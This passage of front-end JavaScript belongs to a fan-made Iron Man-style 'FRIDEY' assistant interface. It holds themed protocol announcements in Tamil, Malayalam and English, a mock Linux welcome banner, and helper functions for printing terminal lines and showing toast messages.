    const currentLang = window.FridayVoice ? window.FridayVoice.currentLanguage : 'en-US';

    switch (protocolName) {
      case 'house_party':
        if (window.FridayAudio) window.FridayAudio.playProtocolSurge();
        if (window.FridayCanvas) window.FridayCanvas.triggerSurge();

        if (currentLang === 'ta-IN') {
          announcement = "ஹவுஸ் பார்ட்டி புரோட்டோகால் தொடங்கப்பட்டது, கோஜோ. பாதுகாப்பு படைகள் ஏவுதளத்திலிருந்து பறக்கின்றன.";
          this.showToast('புரோட்டோகால்: ஹவுஸ் பார்ட்டி');
        } else if (currentLang === 'ml-IN') {
          announcement = "ഹൗസ് പാർട്ടി പ്രോട്ടോക്കോൾ ആരംഭിച്ചു, ഗോജോ. ഡ്രോണുകൾ വിന്യസിക്കുന്നു.";
          this.showToast('പ്രോട്ടോക്കോൾ: ഹൗസ് പാർട്ടി');
        } else {
          announcement = "House Party Protocol initiated, Gojo. Remote telemetry active — defense fleet launching on your mark.";
          this.showToast('PROTOCOL: HOUSE PARTY ACTIVATED');
        }
        break;

      case 'veronica':
        if (window.FridayAudio) window.FridayAudio.playProtocolSurge();
        if (window.FridayCanvas) window.FridayCanvas.triggerSurge();

        if (currentLang === 'ta-IN') {
          announcement = "வெரோனிகா செயற்கைக்கோள் புரோட்டோகால் உறுதி செய்யப்பட்டது, கோஜோ. ஹல்க்பஸ்டர் பாகங்கள் சுற்றுப்பாதையிலிருந்து வருகின்றன.";
          this.showToast('வெரோனிகா தயார்');
        } else if (currentLang === 'ml-IN') {
          announcement = "വെറോണിക്ക ഓർബിറ്റൽ സാറ്റലൈറ്റ് സ്ഥിരീകരിച്ചു, ഗോജോ. ഹൾക്ക്ബസ്റ്റർ മൊഡ്യൂളുകൾ താഴേക്ക് ഇറങ്ങുന്നു.";
          this.showToast('വെറോണിക്ക റെഡി');
        } else {
          announcement = "Veronica orbital deployment cradle confirmed, Gojo. Mark XLIV Hulkbuster modules descending from low Earth orbit.";
          this.showToast('ORBITAL CARRIER: VERONICA DEPLOYED');
        }
        break;

      case 'clean_slate':
        if (window.FridayAudio) window.FridayAudio.playProtocolSurge();
        if (window.FridayCanvas) window.FridayCanvas.triggerSurge();
        if (window.FridayNeuralBg) window.FridayNeuralBg.initNeurons();
        this.terminalEl.innerHTML = '';

        if (currentLang === 'ta-IN') {
          announcement = "கிளீன் ஸ்லேட் புரோட்டோகால் முடிந்தது. அனைத்து நினைவகப் பதிவுகளும் அழிக்கப்பட்டன, கோஜோ.";
          this.showToast('கிளீன் ஸ்லேட் முடிந்தது');
        } else if (currentLang === 'ml-IN') {
          announcement = "ക്ലീൻ സ്ലേറ്റ് പൂർത്തിയായി, ഗോജോ. എല്ലാ ലോഗുകളും മായ്ച്ചു കളഞ്ഞു.";
          this.showToast('ക്ലീൻ സ്ലേറ്റ് പൂർത്തിയായി');
        } else {
          announcement = "Clean Slate Protocol executed, Gojo. Telemetry log wiped and system buffers purged to zero.";
          this.showToast('PROTOCOL: CLEAN SLATE COMPLETE');
        }
        break;

      case 'stealth':
        this.setTheme('stealth');
        if (this.themeSelect) this.themeSelect.value = 'stealth';

        if (currentLang === 'ta-IN') {
          announcement = "ஸ்டெல்த் மோட் இயக்கப்பட்டது, கோஜோ. ரேடார் சிக்னேச்சர் 94% குறைக்கப்பட்டுள்ளது.";
        } else if (currentLang === 'ml-IN') {
          announcement = "സ്റ്റെൽത്ത് മോഡ് സജീവമാക്കി, ഗോജോ. റഡാർ സാന്നിധ്യം കുറച്ചിരിക്കുന്നു.";
        } else {
          announcement = "Stealth telemetry engaged, Gojo. Radar signature dampened by 94.2%. Optical refraction online.";
        }
        break;

      case 'combat':
        this.setTheme('war-machine');
        if (this.themeSelect) this.themeSelect.value = 'war-machine';
        if (window.FridayAudio) window.FridayAudio.playAlert();

        if (currentLang === 'ta-IN') {
          announcement = "போர்க்கள பாதுகாப்பு புரோட்டோகால் தயார், கோஜோ! ரிபல்சர்கள் முழுமையாக சார்ஜ் செய்யப்பட்டுள்ளன.";
          this.showToast('எச்சரிக்கை: போர் முறை');
        } else if (currentLang === 'ml-IN') {
          announcement = "കോംബാറ്റ് മോഡ് സജീവമാക്കി, ഗോജോ. റിപ്പൾസർ കപ്പാസിറ്ററുകൾ പരമാവധി ശേഷിയിലാണ്.";
          this.showToast('മുന്നറിയിപ്പ്: കോംബാറ്റ് മോഡ്');
        } else {
          announcement = "Combat protocol authorized, Gojo. Repulsor capacitors charged to maximum. Targeting reticle synchronized.";
          this.showToast('WARNING: COMBAT HUD ACTIVE');
        }
        break;

      case 'scan':
        if (window.FridayAudio) window.FridayAudio.playNotice();

        if (currentLang === 'ta-IN') {
          announcement = "360 டிகிரியில் ரேடார் சுற்றளவை சோதிக்கிறது... ஆபத்தான சிக்னல்கள் எதுவும் இல்லை, கோஜோ.";
          this.showToast('ஸ்கேன் முடிந்தது: அனைத்தும் பாதுகாப்பு');
        } else if (currentLang === 'ml-IN') {
          announcement = "360 ഡിഗ്രി റഡാർ സ്കാനിംഗ് പൂർത്തിയായി... അപകടകരമായ സാന്നിധ്യങ്ങൾ ഒന്നും കണ്ടെത്തിയില്ല, ഗോജോ.";
          this.showToast('സ്കാൻ പൂർത്തിയായി');
        } else {
          announcement = "Scanning perimeter at 360 degrees, Gojo... Zero hostile signatures detected within 5 kilometers.";
          this.showToast('PERIMETER SCAN COMPLETE: ALL CLEAR');
        }
        break;

      case 'overcharge':
        if (window.FridayAudio) window.FridayAudio.playProtocolSurge();
        if (window.FridayCanvas) window.FridayCanvas.triggerSurge();
        this.telemetry.arcOutput = 4.12;

        if (currentLang === 'ta-IN') {
          announcement = "ஆர்க் ரியாக்டர் சக்தி 4.12 ஜிகாவாட்டாக அதிகரித்துள்ளது, கோஜோ! கூடுதல் சக்தி என்ஜின்களுக்கு திருப்பிவிடப்பட்டது.";
          this.showToast('ஆர்க் சக்தி: 127%');
        } else if (currentLang === 'ml-IN') {
          announcement = "ആർക്ക് റിയാക്ടർ ഔട്ട്പുട്ട് 4.12 ഗിഗാവാട്ടായി ഉയർന്നു, ഗോജോ! എഞ്ചിനിലേക്ക് പവർ തിരിച്ചുവിട്ടു.";
          this.showToast('പവർ സർജ്ജ്: 127%');
        } else {
          announcement = "Arc Reactor output surging to 4.12 Gigawatts, Gojo! Diverting auxiliary power to forward thrusters.";
          this.showToast('POWER SURGE: 127% ARC CAPACITY');
        }
        break;

      case 'diagnostic':
        if (window.FridayAudio) window.FridayAudio.playNotice();

        if (currentLang === 'ta-IN') {
          announcement = `முழு சோதனை அறிக்கை: ஆர்க் ரியாக்டர் ${this.telemetry.arcOutput} ஜிகாவாட், கவசம் ${this.telemetry.armorIntegrity}% தயாராக உள்ளது, கோஜோ.`;
        } else if (currentLang === 'ml-IN') {
          announcement = `സിസ്റ്റം റിപ്പോർട്ട്: ആർക്ക് റിയാക്ടർ ${this.telemetry.arcOutput} ഗിഗാവാട്ട്, കവചം ${this.telemetry.armorIntegrity}% ശേഷിയിൽ പ്രവർത്തിക്കുന്നു, ഗോജോ.`;
        } else {
          announcement = `Full diagnostic sweep complete, Gojo: Arc Core running at ${this.telemetry.arcOutput} GW, Nanotech integrity at ${this.telemetry.armorIntegrity}%, repulsors nominal. We are ready to roll.`;
        }
        break;

      default:
        announcement = `Protocol "${protocolName}" executed according to Gojo's security guidelines.`;
    }

    this.respondAsFriday(announcement);
  }

  fridayGreeting() {
    if (window.FridayAudio) {
      window.FridayAudio.playBootSequence();
    }
    const currentLang = window.FridayVoice ? window.FridayVoice.currentLanguage : 'en-US';

    // Linux motd welcome banner (Normal User mode)
    const motd = `
<span style="color:#00ff9d; font-weight:bold;">Linux fridey-os 6.8.0-gojo-arm64 #1 SMP GNU/Linux</span>
<span style="color:#00b4d8;">GOJO OS v8.4.2 (Gojo Enterprise Edition)</span>
* Host:       Gojo Technologes Hub
* User:       gojo (UID: 1000 • Standard User Session)
* Founder:    <span style="color:#fff; font-weight:bold;">GOJO</span>
* Terminal:   bash 5.2.26 / zsh 5.9 (xterm-256color)
Type <span class="t-highlight">'help'</span> for Linux commands, or <span class="t-highlight">'sudo su'</span> to elevate to root.`;
    this.printStdout(motd, true);

    let greeting = "Good morning, Gojo. FRIDEY online and linked to telemetry. Standard user session active. Enter 'sudo su' if you need root privileges.";

    if (currentLang === 'ta-IN') {
      greeting = "காலை வணக்கம் கோஜோ! FRIDEY ஆன்லைனில் உள்ளது. சாதாரண பயனர் அமர்வு தயார். ரூட் அணுகலுக்கு 'sudo su' என்று தட்டச்சு செய்யவும்.";
    } else if (currentLang === 'ml-IN') {
      greeting = "സുപ്രഭാതം ഗോജോ! FRIDEY സിസ്റ്റം തയ്യാറാണ്. റൂട്ട് ആക്സസിനായി 'sudo su' എന്ന് നൽകുക.";
    }

    this.respondAsFriday(greeting);
  }

  printCommand(cmd) {
    if (!this.terminalEl) return;
    const line = document.createElement('div');
    line.className = 'term-line term-cmd-line';
    const userClass = this.isRoot ? 'p-user root-user' : 'p-user';
    const charClass = this.isRoot ? 'p-prompt-char root-char' : 'p-prompt-char';
    const userStr = this.isRoot ? 'root@fridey' : 'gojo@fridey';
    const char = this.isRoot ? '#' : '$';
    line.innerHTML = `<span class="t-prompt-str"><span class="${userClass}">${userStr}</span><span class="p-colon">:</span><span class="p-path">${this.getDisplayPath()}</span><span class="${charClass}">${char}</span></span> <span class="t-cmd-text">${this.escapeHTML(cmd)}</span>`;
    const activeLine = document.getElementById('termActiveLine');
    if (activeLine && activeLine.parentNode === this.terminalEl) {
      this.terminalEl.insertBefore(line, activeLine);
    } else {
      this.terminalEl.appendChild(line);
    }
    this.terminalEl.scrollTop = this.terminalEl.scrollHeight;
  }

  printStdout(htmlOrText, isHtml = false) {
    if (!this.terminalEl) return;
    const line = document.createElement('div');
    line.className = 'term-line t-stdout';
    if (isHtml) {
      line.innerHTML = htmlOrText;
    } else {
      line.textContent = htmlOrText;
    }
    const activeLine = document.getElementById('termActiveLine');
    if (activeLine && activeLine.parentNode === this.terminalEl) {
      this.terminalEl.insertBefore(line, activeLine);
    } else {
      this.terminalEl.appendChild(line);
    }
    this.terminalEl.scrollTop = this.terminalEl.scrollHeight;
  }

  printAssistant(text) {
    if (!this.terminalEl) return;
    const line = document.createElement('div');
    line.className = 'term-line t-assistant-response';
    line.innerHTML = `<span style="color:var(--theme-primary); font-weight:bold;">[FRIDEY]</span> ${this.escapeHTML(text)}`;
    this.terminalEl.appendChild(line);
    this.terminalEl.scrollTop = this.terminalEl.scrollHeight;
  }

  appendMessage(sender, text) {
    if (sender === 'user') {
      this.printCommand(text);
    } else {
      this.printAssistant(text);
    }
  }

  escapeHTML(str) {
    return str.replace(/[&<>'"]/g, 
      tag => ({
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        "'": '&#39;',
        '"': '&quot;'
      }[tag] || tag)
    );
  }

  showToast(message) {
    let toast = document.getElementById('hudToast');
    if (!toast) {
      toast = document.createElement('div');
      toast.id = 'hudToast';
      toast.className = 'hud-toast';
      toast.innerHTML = `
        <span class="toast-icon">⚡</span>
        <span class="toast-msg" id="toastMessage"></span>
      `;
      document.body.appendChild(toast);
    }

    const msgSpan = document.getElementById('toastMessage');
    if (msgSpan) msgSpan.textContent = message;

    toast.classList.add('show');
    if (this.toastTimeout) clearTimeout(this.toastTimeout);
    this.toastTimeout = setTimeout(() => {
      toast.classList.remove('show');
    }, 3200);
  }
}

// Global Core instance
window.addEventListener('DOMContentLoaded', () => {
  window.FridayCore = new FridayCoreEngine();
});
